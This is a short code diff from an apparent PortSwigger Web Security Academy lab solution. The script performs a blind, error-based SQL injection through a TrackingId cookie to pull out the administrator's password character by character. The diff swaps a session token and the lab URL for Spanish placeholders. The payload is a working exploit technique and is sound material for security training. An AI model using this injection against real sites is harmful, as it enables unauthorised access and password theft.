@@ -31,12 +31,12 @@ def makeSQLi():
         for character in characters:
             cookies = {
                     'TrackingId': f"SB3RVC2QjsIChXzV'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'",
-                    'session': "yhJwbXELgF68qoqh6ofgeLVMmNO3SjFE"
+                    'session': "<Añadir_valor_de_session>"
             }
 
             p1.status(cookies["TrackingId"])
 
-            r = requests.get("https://0ac6007f045a62fb805e08d800740038.web-security-academy.net/", cookies=cookies)
+            r = requests.get("<Añadir_URL>", cookies=cookies)
 
             if r.status_code == 500:
                 password += character
